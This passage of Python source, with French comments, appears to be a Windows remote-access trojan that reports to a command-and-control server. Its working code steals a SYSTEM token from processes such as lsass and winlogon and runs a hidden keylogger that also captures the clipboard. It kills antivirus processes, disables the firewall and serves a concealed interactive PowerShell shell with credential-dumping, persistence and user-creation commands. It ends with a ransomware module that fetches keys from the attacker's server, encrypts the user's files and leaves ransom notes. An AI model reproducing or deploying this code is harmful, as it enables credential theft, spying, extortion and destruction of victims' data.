                    f.write(f"Username: {cred['Username']}\n")
                    f.write(f"Password: {cred['Password']}\n")
                    f.write("-" * 80 + "\n")
            
            s.send(chariot + b"[BROWSERDUMP] Credentials saved to browser_credentials.txt\n")
            #Upload_File(dump_file)
            #os.remove(dump_file)
        else:
            s.send(chariot + b"[BROWSERDUMP] No credentials found in browsers.\n")
        
        s.send(chariot + b"[BROWSERDUMP] Browser dump completed.\n" + chariot)
        
    except ImportError as e:
        s.send(chariot + f"[BROWSERDUMP] Missing dependency: {e}\n".encode('utf-8'))
        s.send(b"[BROWSERDUMP] Required: pycryptodome (pip install pycryptodome)\n" + chariot)
    except Exception as e:
        s.send(chariot + f"[BROWSERDUMP] Error: {e}\n".encode('utf-8') + chariot)



# ============================================
# FONCTIONS - PRIVILEGE ESCALATION
# ============================================

# Active tous les privilèges disponibles dans le token actuel (SeDebug, SeBackup, etc.)
def Enable_All_Privileges():
    s.send(chariot + b"[GETPRIVS] Attempting to enable all privileges...\n")
    try:
        import win32security
        import win32api
        import win32con
        
        hToken = win32security.OpenProcessToken(
            win32api.GetCurrentProcess(),
            win32con.TOKEN_ADJUST_PRIVILEGES | win32con.TOKEN_QUERY
        )
        
        all_tokens = win32security.GetTokenInformation(hToken, win32security.TokenPrivileges)
        
        enabled_count = 0
        failed_count = 0
        
        s.send(chariot)
        for token in all_tokens:
            luid = token[0]
            priv_status = token[1]
            
            # Convertir LUID en nom de privilège
            try:
                priv_name = win32security.LookupPrivilegeName(None, luid)
            except Exception:
                priv_name = f"Unknown_LUID_{luid}"
            
            if priv_status == win32security.SE_PRIVILEGE_ENABLED:
                continue
            
            
            try:
                privilege = [(luid, win32security.SE_PRIVILEGE_ENABLED)]
                win32security.AdjustTokenPrivileges(hToken, False, privilege)
                enabled_count += 1
                s.send(f"[GETPRIVS] Enabled: {priv_name}\n".encode('utf-8'))
            except Exception as e:
                failed_count += 1
                s.send(f"[GETPRIVS] Failed: {priv_name} - {e}\n".encode('utf-8'))
        
        if enabled_count > 0:
            s.send(chariot + f"[GETPRIVS] Successfully enabled {enabled_count} privilege(s).\n".encode('utf-8') + chariot)
        if failed_count > 0:
            s.send(chariot + f"[GETPRIVS] Failed to enable {failed_count} privilege(s).\n".encode('utf-8') + chariot)
        
    except Exception as e:
        s.send(chariot + f"[GETPRIVS] Error: {e}\n".encode('utf-8') + chariot)

# Élève les privilèges à SYSTEM en dupliquant le token d'un processus SYSTEM (winlogon, lsass, services...)
# Le token est stocké globalement et réappliqué automatiquement aux threads qui en ont besoin
def Get_System():
    s.send(chariot + b"[GETSYSTEM] Attempting privilege escalation to SYSTEM...\n")
    
    if platform.system() != "Windows":
        s.send(chariot + b"[GETSYSTEM] Only available on Windows." + chariot)
        return
        
    try:
        import win32con, win32api, win32security, pywintypes
        import psutil
        
        # ÉTAPE 1: Activer SeDebugPrivilege ET SeImpersonatePrivilege
        s.send(b"[GETSYSTEM] Enabling required privileges...\n")
        try:
            hToken = win32security.OpenProcessToken(
                win32api.GetCurrentProcess(),
                win32con.TOKEN_ADJUST_PRIVILEGES | win32con.TOKEN_QUERY
            )
            
            # Activer SeDebugPrivilege
            luid_debug = win32security.LookupPrivilegeValue(None, "SeDebugPrivilege")
            privilege_debug = [(luid_debug, win32security.SE_PRIVILEGE_ENABLED)]
            win32security.AdjustTokenPrivileges(hToken, False, privilege_debug)
            s.send(b"[GETSYSTEM] SeDebugPrivilege enabled.\n")
            
            # Activer SeImpersonatePrivilege
            luid_impersonate = win32security.LookupPrivilegeValue(None, "SeImpersonatePrivilege")
            privilege_impersonate = [(luid_impersonate, win32security.SE_PRIVILEGE_ENABLED)]
            win32security.AdjustTokenPrivileges(hToken, False, privilege_impersonate)
            s.send(b"[GETSYSTEM] SeImpersonatePrivilege enabled.\n")
            
            hToken.Close()
            
        except Exception as e:
            s.send(chariot + f"[GETSYSTEM] WARNING: Could not enable privileges: {e}\n".encode('utf-8'))
        
        # ÉTAPE 2: Chercher un processus SYSTEM accessible
        system_processes = ["winlogon.exe", "services.exe", "wininit.exe", "lsass.exe", "csrss.exe"]
        system_pid = None
        found_process_name = None
        
        s.send(chariot + b"[GETSYSTEM] Searching for accessible SYSTEM process...\n")
        
        system_candidates = []
        
        for proc in psutil.process_iter(['pid', 'name', 'username']):
            try:
                proc_name = proc.info['name'].lower() if proc.info['name'] else ""
                proc_user = proc.info['username']
                
                if proc_name in system_processes:
                    if proc_user is None:
                        system_candidates.append((proc.info['pid'], proc.info['name'], "Protected/SYSTEM"))
                    else:
                        proc_user_upper = proc_user.upper()
                        is_system = any([
                            "SYSTEM" in proc_user_upper,
                            "SYSTÈME" in proc_user_upper,
                            "AUTORITE NT" in proc_user_upper,
                            "NT AUTHORITY" in proc_user_upper
                        ])
                        
                        if is_system:
                            system_candidates.append((proc.info['pid'], proc.info['name'], proc_user))
                            
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue
        
        if not system_candidates:
            s.send(chariot + b"[GETSYSTEM] ERROR: No SYSTEM process found.\n" + chariot)
            return
        
        for pid, name, user in system_candidates:
            
            try:
                hProcess = win32api.OpenProcess(
                    win32con.PROCESS_QUERY_INFORMATION,
                    False,
                    pid
                )
                
                hToken = win32security.OpenProcessToken(
                    hProcess,
                    win32con.TOKEN_DUPLICATE | win32con.TOKEN_IMPERSONATE | win32con.TOKEN_QUERY
                )
                
                system_pid = pid
                found_process_name = name
                s.send(f"[GETSYSTEM] SUCCESS: Opened {name} (PID: {pid})\n".encode('utf-8'))
                break
                
            except pywintypes.error as e:
                continue
        
        if not system_pid:
            s.send(chariot + b"[GETSYSTEM] ERROR: All SYSTEM processes are protected.\n" + chariot)
            return
        
        # ÉTAPE 5: Dupliquer le token SYSTEM avec tous les droits
        s.send(chariot + b"[GETSYSTEM] Duplicating SYSTEM token...\n")
        dupToken = win32security.DuplicateTokenEx(
            hToken,
            win32security.SecurityImpersonation,
            win32con.TOKEN_ALL_ACCESS,  # Tous les droits pour réutilisation
            win32security.TokenImpersonation,
            None
        )
        
        # ÉTAPE 6: Stocker le token globalement pour réutilisation
        global system_token, system_process_handle
        system_token = dupToken
        system_process_handle = hProcess
        
        # ÉTAPE 7: Impersonner le token SYSTEM sur le thread actuel
        s.send(b"[GETSYSTEM] Impersonating SYSTEM token...\n")
        win32security.ImpersonateLoggedOnUser(system_token)
        
        # ÉTAPE 8: Vérification
        s.send(b"[GETSYSTEM] Verifying impersonation...\n")
        
        # Nettoyer uniquement le handle de token source (pas le dupToken ni hProcess)
        hToken.Close()
        
        s.send(chariot + b"[GETSYSTEM] *** SUCCESS! ***\n")
        s.send(f"[GETSYSTEM] Impersonated SYSTEM token from: {found_process_name} (PID: {system_pid})\n".encode('utf-8'))
        s.send(b"[GETSYSTEM] Token SYSTEM saved globally for reuse.\n")
        s.send(b"[GETSYSTEM] All sensitive operations will now use SYSTEM privileges.\n" + chariot)
        
    except ImportError:
        s.send(chariot + b"[GETSYSTEM] ERROR: pywin32 and psutil required.\n" + chariot)
    except pywintypes.error as e:
        s.send(chariot + f"[GETSYSTEM] Windows API Error: {e}\n".encode('utf-8') + chariot)
    except Exception as e:
        s.send(chariot + f"[GETSYSTEM] Error: {e}\n".encode('utf-8') + chariot)

# Affiche l'utilisateur actuel, le SID et vérifie si on est SYSTEM (lit le token du thread)
def Whoami():
    s.send(chariot + b"[WHOAMI] Retrieving current user information...\n")

    if not Ensure_System_Privileges():
        s.send(b"[WHOAMI] WARNING: No SYSTEM token available.\n")
        s.send(b"[WHOAMI] Run 'getsystem' first for better success rate.\n")
    else:
        s.send(b"[WHOAMI] SYSTEM privileges applied to this thread.\n")

    try:
        import win32api, win32security, win32con

        username = win32api.GetUserName()
        s.send(f"[WHOAMI] Current User: {username}\n".encode('utf-8'))

        # Essayer d'abord le token du thread (si impersonné), sinon celui du processus
        try:
            hToken = win32security.OpenThreadToken(
                win32api.GetCurrentThread(),
                win32con.TOKEN_QUERY,
                True  # OpenAsSelf
            )
        except:
            # Pas de token thread, utiliser le token processus
            hToken = win32security.OpenProcessToken(
                win32api.GetCurrentProcess(),
                win32con.TOKEN_QUERY
            )
        
        token_user = win32security.GetTokenInformation(hToken, win32security.TokenUser)
        user_sid = token_user[0]
        sid_str = win32security.ConvertSidToStringSid(user_sid)
        s.send(f"[WHOAMI] User SID: {sid_str}\n".encode('utf-8'))

        # Obtenir le format DOMAIN\Username avec LookupAccountSid
        try:
            account_name, domain_name, account_type = win32security.LookupAccountSid(None, user_sid)
            full_name = f"{domain_name}\\{account_name}"
            s.send(f"[WHOAMI] Full Name: {full_name}\n".encode('utf-8'))
        except Exception:
            pass  # LookupAccountSid peut échouer dans certains contextes
        
        # Vérification SYSTEM par SID
        if sid_str == "S-1-5-18":
            s.send(b"[WHOAMI] *** CONFIRMED: Running as NT AUTHORITY\\SYSTEM ***\n" + chariot)

        hToken.Close()
    except Exception as e:
        s.send(f"[WHOAMI] Error: {e}\n".encode('utf-8'))

# Réapplique l'impersonation SYSTEM au thread actuel (appelé automatiquement par lsadump, samdump, etc.)
def Ensure_System_Privileges():
    """
    Réapplique l'impersonation SYSTEM au thread actuel.
    À appeler au début de toute fonction nécessitant des privilèges SYSTEM.
    Retourne True si SYSTEM, False sinon.
    """
    global system_token
    
    if system_token is None:
        return False
    
    try:
        import win32security
        # Réappliquer l'impersonation sur ce thread
        win32security.ImpersonateLoggedOnUser(system_token)
        return True
    except Exception:
        return False
            
# ============================================
# FONCTIONS - KEYLOGGER
# ============================================

# Démarre le keylogger dans un thread séparé et envoie les frappes capturées au serveur C2
def StartKeyLogger():
    s.send(chariot + b"[KEYLOGGER] Starting Keylogger...")
    keylogger_thread = threading.Thread(target=KeyLogger, name="KeyloggerThread", daemon=True)
    keylogger_thread.start()

# Thread du keylogger qui capture les frappes clavier et les enregistre dans un fichier caché
def KeyLogger():
    s.send(chariot + f"[KEYLOGGER] Keylogger is running. Printing data in {AppData_Path_Keylog}\\keylogs.txt".encode('utf-8') + chariot + chariot)
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        while not stop_event.is_set():
            listener.join(0.1)

# Arrête le thread du keylogger et nettoie les ressources
def StopKeyLogger():
    s.send(chariot + b"[KEYLOGGER] Stopping Keylogger...")
    stop_event.set()
    for thread in threading.enumerate():
        if thread.name == "KeyloggerThread":
            thread.join()
            s.send(chariot + b"[KEYLOGGER] Keylogger stopped." + chariot + chariot)

def On_Off_AV(On_Off):
    if On_Off.lower() == "on":
        s.send(chariot + b"[ANTIVIRUS] Starting antivirus services..." + chariot)
        # Redémarrer les services antivirus (exemple pour Windows Defender)
        try:
            subprocess.run(["sc", "start", "WinDefend"], capture_output=True, text=True, creationflags=CREATE_NO_WINDOW)
            s.send(b"[ANTIVIRUS] Antivirus services started.\n" + chariot)
        except Exception as e:
            s.send(f"[ANTIVIRUS] Failed to start antivirus services: {e}\n".encode('utf-8') + chariot)
    elif On_Off.lower() == "off":
        s.send(chariot + b"[ANTIVIRUS] Attempting to stop antivirus services..." + chariot)

        # Need to be system
        if not Ensure_System_Privileges():
            s.send(b"[ANTIVIRUS] WARNING: No SYSTEM token available. Run 'getsystem' first for better success rate.\n" + chariot)
            return
        else:
            s.send(b"[ANTIVIRUS] SYSTEM privileges applied to this thread.\n")

        try:
            import psutil
            for proc in psutil.process_iter(['pid', 'name']):
                if proc.info['name'] and any(av in proc.info['name'].lower() for av in ['av', 'antivirus', 'defender', 'security']):
                    try:
                        proc.terminate()
                        s.send(f"[ANTIVIRUS] Terminated: {proc.info['name']} (PID: {proc.info['pid']})\n".encode('utf-8'))
                    except Exception as e:
                        s.send(f"[ANTIVIRUS] Failed to terminate {proc.info['name']} (PID: {proc.info['pid']}): {e}\n".encode('utf-8'))
        except Exception as e:
            s.send(f"[ANTIVIRUS] Error: {e}\n".encode('utf-8') + chariot)

def On_Off_FW(On_Off):
    if On_Off.lower() == "on":
        s.send(chariot + b"[FIREWALL] Enabling Windows Firewall..." + chariot)
        try:
            results = subprocess.run(["netsh", "advfirewall", "set", "allprofiles", "state", "on"], capture_output=True, text=True, creationflags=CREATE_NO_WINDOW)
            if results.returncode == 0:
                s.send(b"[FIREWALL] Windows Firewall enabled.\n" + chariot)
            else:
                s.send(f"[FIREWALL] Failed to enable firewall: {results.stderr}\n".encode('utf-8') + chariot)
        except Exception as e:
            s.send(f"[FIREWALL] Failed to enable firewall: {e}\n".encode('utf-8') + chariot)
    elif On_Off.lower() == "off":
        s.send(chariot + b"[FIREWALL] Disabling Windows Firewall..." + chariot)
        try:
            results = subprocess.run(["netsh", "advfirewall", "set", "allprofiles", "state", "off"], capture_output=True, text=True, creationflags=CREATE_NO_WINDOW)
            if results.returncode == 0:
                s.send(b"[FIREWALL] Windows Firewall disabled.\n" + chariot)
            else:
                s.send(f"[FIREWALL] Failed to disable firewall: Might not be admin\n".encode('utf-8') + chariot)
        except Exception as e:
            s.send(f"[FIREWALL] Failed to disable firewall: {e}\n".encode('utf-8') + chariot)

# Callback à chaque touche pressée - capture les frappes, gère les CTRL+, SHIFT+ et les enregistre
def on_press(key):
    pressed_keys.add(key)
    if not os.path.exists(AppData_Path_Keylog):
        os.makedirs(AppData_Path_Keylog)
        if not os.path.exists(AppData_Path_Keylog_File):
            with open(AppData_Path_Keylog_File, 'w', encoding='utf-8') as f:
                pass
        ctypes.windll.kernel32.SetFileAttributesW(AppData_Path_Keylog_File, 0x02)
    with open(AppData_Path_Keylog_File, 'a', encoding='utf-8') as logkey:
        vk = getattr(key, 'vk', None)
        if vk in NUMPAD_VK_MAP:
            logkey.write(NUMPAD_VK_MAP[vk])
            return
        
        if hasattr(key, 'char') and key.char is not None:
            code = ord(key.char)
            if code == 22 and any(k in pressed_keys for k in (keyboard.Key.ctrl_l, keyboard.Key.ctrl_r)):
                clipboard_content = paste()
                letter = chr(code + 64)
                logkey.write(f'[CTRL+{letter}: {clipboard_content}]')
            elif 1 <= code <= 26 and any(k in pressed_keys for k in (keyboard.Key.ctrl_l, keyboard.Key.ctrl_r)):
                letter = chr(code + 64)
                logkey.write(f'[CTRL+{letter}]')
            elif key.char.isalpha() and any(k in pressed_keys for k in (keyboard.Key.shift, keyboard.Key.shift_r)):
                logkey.write(f'[SHIFT+{key.char.upper()}]')
            elif key.char.isalpha() and any(k in pressed_keys for k in (keyboard.Key.alt, keyboard.Key.alt_gr)):
                logkey.write(f'[SHIFT+{key.char.upper()}]')
            else:
                logkey.write(key.char)
        elif key not in modifier_keys:
            if key == keyboard.Key.space:
                logkey.write(" ")
            elif key == keyboard.Key.enter:
                logkey.write("\n")
            elif key == keyboard.Key.backspace:
                RemoveLastChar(AppData_Path_Keylog_File)
            elif isinstance(key, keyboard.Key):
                logkey.write(f'[{key.name.upper()}]')
            else:
                logkey.write(f'[KEY: {key}]')

# Callback à chaque touche relâchée - retire la touche du set des touches pressées
def on_release(key):
    if key in pressed_keys:
        pressed_keys.remove(key)

# Supprime le dernier caractère du fichier de log (gestion du backspace)
def RemoveLastChar(AppData_Path_Keylog_File):
    with open(AppData_Path_Keylog_File, "r+") as f:
        f.seek(0, os.SEEK_END)
        pos = f.tell()
        if (pos > 0):
            f.seek(pos - 1)
            f.truncate()

# ============================================
# FONCTIONS - POWERSHELL TERMINAL
# ============================================

# Ouvre un terminal PowerShell interactif permettant d'exécuter des commandes distantes avec persistance du contexte
def Open_PowerShell():
    s.send(chariot + b"[POWERSHELL] Opening PowerShell terminal..." + chariot + chariot)

    # Répertoire de travail courant de la session "emulée"
    ps_cwd = os.getcwd()


    try:
        proc = subprocess.Popen(
            ["powershell", "-NoLogo", "-NoProfile", "-ExecutionPolicy", "Bypass"],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            shell=False,
            bufsize=0,
            universal_newlines=False,  # on travaille en bytes
            creationflags=CREATE_NO_WINDOW
        )
        global powershell_proc 
        powershell_proc = proc
    except Exception as e:
        s.send(f"[POWERSHELL] Erreur: {e}\n".encode('utf-8'))
        return

    stop_evt = threading.Event()

    def pump_stdout():
        try:
            while not stop_evt.is_set():
                chunk = proc.stdout.read(1024)
                if not chunk:
                    break
                try:
                    s.send(chunk)
                except Exception:
                    break
        except Exception:
            pass

    t_out = threading.Thread(target=pump_stdout, daemon=True)
    t_out.start()

    try:
        while True:
            if proc.poll() is not None:
                break

            raw = s.recv(4096)
            if not raw:
                sleep(0.05)
                continue

            cmd = raw.decode('utf-8', errors='replace').strip()
            if cmd == "":
                
                continue

            lower = cmd.lower()

            # Commandes personnalisées
            if cmd in ('exit', 'exit()', 'quit'):
                try:
                    proc.stdin.write(b"exit\r\n")
                    proc.stdin.flush()
                except Exception:
                    pass
                proc.wait(timeout=3)
                break
            elif cmd.startswith('cd '):
                try:
                    os.chdir(cmd[3:].strip())
                    ps_cwd = os.getcwd()
                except FileNotFoundError as e:
                    s.send(f"[POWERSHELL] Error: {e}\n".encode())
                proc.stdin.write(b"\r\n")
                proc.stdin.flush()
                continue
            elif cmd == "clear":
                Clear_Screen()
                proc.stdin.write(b"\r\n")
                proc.stdin.flush()
                continue
            elif cmd == "sysinfo":
                Get_SysInfo()
                proc.stdin.write(b"\r\n")
                proc.stdin.flush()
                continue
            elif cmd == "arpscan":
                ARP_Scan()
                proc.stdin.write(b"\r\n")
                proc.stdin.flush()
                continue
            elif cmd.startswith("read "):
                Read_File(cmd[5:].strip())
                proc.stdin.write(b"\r\n")
                proc.stdin.flush()
                continue
            elif cmd.startswith("netstat"):
                if cmd == "netstat":
                    NetStat("inet")
                else:
                    kind = cmd.split(" ")[1].strip()
                    NetStat(kind)
                s.send(chariot + chariot)
                proc.stdin.write(b"\r\n")
                proc.stdin.flush()
                continue
            elif cmd.startswith("portscan "):
                parts = cmd[9:].strip().split(" ", 1)
                if len(parts) == 2:
                    start_port = int(parts[0])
                    end_port = int(parts[1])
                else:
                    start_port = 1
                    end_port = 1024
                Port_Scan(start_port, end_port)
            elif cmd.startswith("remoteportscan "):
                parts = cmd[15:].strip().split(" ", 2)
                if len(parts) >= 3:
                    target_ip = parts[0]
                    start_port = int(parts[1])
                    end_port = int(parts[2])
                else:
                    target_ip = parts[0]
                    start_port = 1
                    end_port = 1024
                Remote_Port_Scan(target_ip, start_port, end_port)
                proc.stdin.write(b"\r\n")
                proc.stdin.flush()
                continue
            elif cmd.startswith("download "):
                filename = cmd[9:].strip()
                Download_File(filename)
                proc.stdin.write(b"\r\n")
                proc.stdin.flush()
                continue
            elif cmd.startswith("upload "):
                filepath = cmd[7:].strip()
                Upload_File(filepath)
                proc.stdin.write(b"\r\n")
                proc.stdin.flush()
                continue
            elif cmd.startswith("zipupload "):
                directory = cmd[10:].strip()
                ZIP_Upload(directory)
                proc.stdin.write(b"\r\n")
                proc.stdin.flush()
                continue
            elif cmd == "addschedule":
                Add_Scheduled()
                proc.stdin.write(b"\r\n")
                proc.stdin.flush()
                continue
            elif cmd == "addstartup":
                Add_Startup()
                proc.stdin.write(b"\r\n")
                proc.stdin.flush()
                continue
            elif cmd.startswith("rdp "):
                On_Off = cmd[4:].strip().lower()
                Turn_RDP_On_Off(On_Off)
                proc.stdin.write(b"\r\n")
                proc.stdin.flush()
                continue
            elif cmd.startswith("createlocaluser "):
                parts = cmd[len("createlocaluser "):].strip().split(" ", 1)
                if len(parts) >= 2:
                    username = parts[0]
                    password = parts[1]
                    Create_User("createlocaluser", username, password)
                proc.stdin.write(b"\r\n")
                proc.stdin.flush()
                continue
            elif cmd.startswith("createdomainuser "):
                parts = cmd[len("createdomainuser "):].strip().split(" ", 1)
                if len(parts) >= 2:
                    username = parts[0]
                    password = parts[1]
                    Create_User("createdomainuser", username, password)
                proc.stdin.write(b"\r\n")
                proc.stdin.flush()
                continue
            elif cmd.startswith("rdpgroupadd "):
                username = cmd[len("rdpgroupadd "):].strip()
                RDP_Group_Add(username)
                proc.stdin.write(b"\r\n")
                proc.stdin.flush()
                continue
            elif cmd.startswith("admingroupadd "):
                parts = cmd[len("admingroupadd "):].strip().split(" ", 1)
                if len(parts) >= 2:
                    method = parts[0]
                    username = parts[1]
                Admin_Group_Add(method, username)
                proc.stdin.write(b"\r\n")
                proc.stdin.flush()
                continue
            elif cmd.startswith("search "):
                args = cmd[7:].strip().split(" ", 1)
                if len(args) == 2:
                    Search_File(args[0], args[1])
                proc.stdin.write(b"\r\n")
                proc.stdin.flush()
                continue
            elif cmd == "getscreen":
                Take_Screenshot(AppData_Path_Screen)
                proc.stdin.write(b"\r\n")
                proc.stdin.flush()
                continue
            elif cmd.startswith("loadmodule "):
                Load_Module(cmd[len("loadmodule "):].strip())
                proc.stdin.write(b"\r\n")
                proc.stdin.flush()
                continue
            elif cmd.startswith("loadpwshmodule "):
                Load_Pwsh_Module(cmd[len("loadpwshmodule "):].strip())
                proc.stdin.write(b"\r\n")
                proc.stdin.flush()
                continue
            elif cmd.startswith("loadobfpwshmodule "):
                Load_Obf_Pwsh_Module(cmd[len("loadobfpwshmodule "):].strip())
                proc.stdin.write(b"\r\n")
                proc.stdin.flush()
                continue
            elif cmd.startswith("removemodule "):
                Remove_Module(cmd[len("removemodule "):].strip())
                proc.stdin.write(b"\r\n")
                proc.stdin.flush()
                continue
            elif cmd.startswith("runmodule "):
                args = cmd[len("runmodule "):].strip().split(" ", 1)               
                module_name = args[0]
                module_args = args[1] if len(args) > 1 else ""
                Run_Module(module_name, module_args)
                proc.stdin.write(b"\r\n")
                proc.stdin.flush()
                continue
            elif cmd.startswith("runpwshmodule "):
                args = cmd[len("runpwshmodule "):].strip().split(" ", 1)
                module_name = args[0]
                module_args = args[1] if len(args) > 1 else ""
                Run_Pwsh_Module(module_name, module_args)
                proc.stdin.write(b"\r\n")
                proc.stdin.flush()
                continue
            elif cmd.startswith("runobfpwshmodule "):
                args = cmd[len("runobfpwshmodule "):].strip().split(" ", 1)
                module_name = args[0]
                module_args = args[1] if len(args) > 1 else ""
                Run_Obf_Pwsh_Module(module_name, module_args)
                proc.stdin.write(b"\r\n")
                proc.stdin.flush()
                continue
            elif cmd.startswith("loadrunmempwshmodule "):
                args = cmd[len("loadrunmempwshmodule "):].strip().split(" ", 1)
                module_name = args[0]
                module_args = args[1] if len(args) > 1 else ""
                Load_Run_Memory_Pwsh_Module(module_name, module_args)
                proc.stdin.write(b"\r\n")
                proc.stdin.flush()
                continue
            elif cmd.startswith("loadrunobfmempwshmodule "):
                args = cmd[len("loadrunobfmempwshmodule "):].strip().split(" ", 1)
                module_name = args[0]
                module_args = args[1] if len(args) > 1 else ""
                Load_Run_Obf_Memory_Pwsh_Module(module_name, module_args)
                proc.stdin.write(b"\r\n")
                proc.stdin.flush()
                continue
            elif cmd == "startkeylogger":
                StartKeyLogger()
                proc.stdin.write(b"\r\n")
                proc.stdin.flush()
                continue
            elif cmd == "stopkeylogger":
                StopKeyLogger()
                proc.stdin.write(b"\r\n")
                proc.stdin.flush()
                continue
            elif cmd.startswith == "av ":
                On_Off = cmd[3:].strip().lower()
                On_Off_AV(On_Off)
                proc.stdin.write(b"\r\n")
                proc.stdin.flush()
                continue
            elif cmd.startswith == "fw ":
                On_Off = cmd[3:].strip().lower()
                On_Off_FW(On_Off)
                proc.stdin.write(b"\r\n")
                proc.stdin.flush()
                continue
            elif cmd == "ps":
                Process_List()
                proc.stdin.write(b"\r\n")
                proc.stdin.flush()
                continue
            elif cmd.startswith("dump "):
                Dump_Process_Memory(cmd[5:].strip())
                proc.stdin.write(b"\r\n")
                proc.stdin.flush()
                continue
            elif cmd == "hashdump":
                HashDump()
                proc.stdin.write(b"\r\n")
                proc.stdin.flush()
                continue
            elif cmd == "lsadump":
                Lsa_Dump()
                proc.stdin.write(b"\r\n")
                proc.stdin.flush()
                continue
            elif cmd == "samdump":
                Sam_Dump()
                proc.stdin.write(b"\r\n")
                proc.stdin.flush()
                continue
            elif cmd == "dumpnav":
                Dump_Navigators_Credentials()
                proc.stdin.write(b"\r\n")
                proc.stdin.flush()
                continue
            elif cmd == "getprivs":
                Enable_All_Privileges()
                proc.stdin.write(b"\r\n")
                proc.stdin.flush()
                continue
            elif cmd == "getsystem":
                Get_System()
                proc.stdin.write(b"\r\n")
                proc.stdin.flush()
                continue
            elif cmd == "whoami":
                Whoami()
                proc.stdin.write(b"\r\n")
                proc.stdin.flush()
                continue
            elif (cmd.startswith("startransom")):
                if cmd == "startransom":
                    user = getpass.getuser()
                    path_to_files = "C:\\Users\\" + user
                    Start_Ransomware(path_to_files)
                elif cmd.startswith("startransom "):
                    path_to_files = cmd[len("startransom "):].strip()
                    Start_Ransomware(path_to_files)
                proc.stdin.write(b"\r\n")
                proc.stdin.flush()
                continue
            elif (cmd.startswith("stopransom")):
                if cmd == "stopransom":
                    user = getpass.getuser()
                    path_to_files = "C:\\Users\\" + user
                    Stop_Ransomware(path_to_files)
                elif cmd.startswith("stopransom "):
                    path_to_files = cmd[len("stopransom "):].strip()
                    Stop_Ransomware(path_to_files)
                proc.stdin.write(b"\r\n")
                proc.stdin.flush()
                continue
            elif cmd == "help":
                s.send(chariot + help_menu.encode('utf-8') + chariot)
                proc.stdin.write(b"\r\n")
                proc.stdin.flush()
                continue

            # Si ce n'est pas une commande custom → envoyer à PowerShell
            norm = cmd.replace('\r\n', '\n').replace('\r', '\n').replace('\n', '\r\n').encode('utf-8', 'replace')
            try:
                proc.stdin.write(norm)
                proc.stdin.write(b"\r\n")
                proc.stdin.flush()
            except BrokenPipeError:
                break
            except Exception:
                pass

            

    finally:
        stop_evt.set()
        try:
            t_out.join(timeout=1.0)
        except Exception:
            pass
        try:
            if proc.poll() is None:
                proc.terminate()
        except Exception:
            pass

    s.send(b"\n[POWERSHELL] Session interactive terminee.\n" + chariot)

# ============================================
# FONCTIONS - RANSOMWARE
# ============================================

# Génère une clé de chiffrement Fernet via le serveur C2 et retourne le handle + l'ID
def KeyGen():
    keygenurl = f"http://{myip}/ransomware/ransomware.php"
    id = random.randint(100000, 999999)
    params = {"id": id}
    req = requests.get(keygenurl, params=params)
    k = req.text.strip().encode("utf-8")
    h_fernet = Fernet(k)
    return h_fernet, id

# Chiffre tous les fichiers d'un répertoire avec Fernet et remplace leur contenu par la version chiffrée
def Encrypt(path, h_fernet):
    for root, dirs, files in os.walk(path):
        for file in files:
            file_path = os.path.join(root, file)
            s.send(f"[RANSOMWARE] Encrypting file: {file_path}\n".encode('utf-8'))
            if not file.endswith('.cry') and file != 'id.txt' and file != 'RANSOM_NOTE.txt':
                try:
                    with open(file_path, 'rb') as f:
                        data = f.read()
                    encrypted_data = h_fernet.encrypt(data)
                    with open(file_path, 'wb') as f:
                        f.write(encrypted_data)
                    os.rename(file_path, file_path + '.cry')
                except PermissionError:
                    pass

# Stocke l'ID de la victime dans un fichier id.txt pour identification lors du déchiffrement
def Store_Id(path, id):  
    # Store ID in separate file
    with open(os.path.join(path, 'id.txt'), 'w') as f:
        f.write(str(id))
    
    # Store key in separate file
    #with open(os.path.join(path, 'key.txt'), 'wb') as f:
    #    f.write(key)

# Affiche la note de ransom dans chaque sous-répertoire avec les instructions pour la victime
def Display_Ransom_Note(path):
    ransom_note = f"""
    Your files have been encrypted!
    
    To decrypt your files, you need to pay a ransom.
    
    Contact us with your ID to get the decryption key.
    
    ID file is located at: {os.path.join(path, 'id.txt')}
    
    Failure to comply will result in permanent loss of your data.
    """
    for root, dirs, files in os.walk(path):
        with open(os.path.join(root, 'RANSOM_NOTE.txt'), 'w') as f:
            f.write(ransom_note)

# Démarre le processus de ransomware: génère clé, chiffre fichiers, crée note de ransom
def Start_Ransomware(path_to_files):
    s.send(chariot + b"[RANSOMWARE] Starting ransomware encryption...\n")
    h_fernet, id = KeyGen()
    Encrypt(path_to_files, h_fernet)
    Store_Id(path_to_files, id)
    Display_Ransom_Note(path_to_files)
    s.send(b"[RANSOMWARE] Encryption complete. Ransom note created.\n" + chariot)

# Récupère l'ID de la victime et la clé de déchiffrement depuis le serveur C2
def Get_Id(path):
    with open(os.path.join(path, 'id.txt'), 'r') as f:
        id = f.read()
    keygenurl = f"http://{myip}/ransomware/getid.php"
    params = {"getkey": id}
    req = requests.get(keygenurl, params=params)
    k = req.text.strip().encode("utf-8")
    h_fernet = Fernet(k)
    
    return h_fernet, id

# Déchiffre tous les fichiers d'un répertoire de manière récursive avec la clé Fernet
def Decrypt(path, h_fernet):
    for root, dirs, files in os.walk(path):
        for file in files:
            if file.endswith('.cry'):
                file_path = os.path.join(root, file)
                s.send(f"[RANSOMWARE] Decrypting file: {file_path}\n".encode('utf-8'))
                with open(file_path, 'rb') as f:
                    encrypted_data = f.read()
                basename, extension = os.path.splitext(file_path)
                decrypted_data = h_fernet.decrypt(encrypted_data)
                with open(os.path.join(root, basename), 'wb') as f:
                    f.write(decrypted_data)
                os.remove(file_path)

# Supprime toutes les notes de ransom après déchiffrement
def Delete_Ransom_Note(path):
    for root, dirs, files in os.walk(path):
        ransom_note_path = os.path.join(root, 'RANSOM_NOTE.txt')
        if os.path.exists(ransom_note_path):
            os.remove(ransom_note_path)

# Supprime le fichier id.txt après déchiffrement
def Delete_Key_Id_Files(path):
    id_path = os.path.join(path, 'id.txt')
    if os.path.exists(id_path):
        os.remove(id_path)

# Supprime l'ID et la clé du serveur C2 après déchiffrement réussi
def Delete_In_Server(id):
    deleteurl = f"http://{myip}/ransomware/deleteid.php"
    params = {"deleteid": id}
    req = requests.get(deleteurl, params=params)


# Arrête le ransomware: récupère clé, déchiffre fichiers, nettoie traces
def Stop_Ransomware(path_to_files):
    s.send(chariot + b"[RANSOMWARE] Starting ransomware decryption...\n")
    h_fernet, id = Get_Id(path_to_files)
    Decrypt(path_to_files, h_fernet)
    Delete_Ransom_Note(path_to_files)
    Delete_Key_Id_Files(path_to_files)
